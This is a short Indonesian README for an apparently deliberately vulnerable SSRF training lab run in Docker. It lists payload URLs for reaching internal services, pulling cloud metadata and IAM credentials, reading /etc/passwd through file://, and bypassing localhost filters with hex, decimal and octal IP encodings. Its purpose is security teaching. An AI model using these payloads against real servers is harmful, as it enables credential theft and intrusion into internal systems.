# 🌐 SSRF Lab — WebFetcher Pro

**OWASP A10: Server-Side Request Forgery (SSRF)**

## Port

`http://localhost:8008`

## Cara Penggunaan

Tidak perlu login. Langsung masukkan URL dan klik "Fetch URL".

## Vulnerabilities yang Ada

### 1. Akses Internal Services

```
http://localhost/
http://127.0.0.1/
http://labsec-db:3306/
http://labsec-dashboard/
```

### 2. Cloud Metadata Exfiltration

```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

### 3. Local File Read

```
file:///etc/passwd
file:///etc/hosts
file:///var/www/html/index.php
```

### 4. IP Encoding Bypass

```
http://0x7f000001/     → 127.0.0.1 hex
http://2130706433/     → 127.0.0.1 decimal
http://0177.0.0.1/     → 127.0.0.1 octal
```

## Cara Start Lab

```bash
cd SSRF && docker-compose up -d
```

---

⚠️ **Disclaimer**: Lab ini untuk edukasi keamanan siber saja.
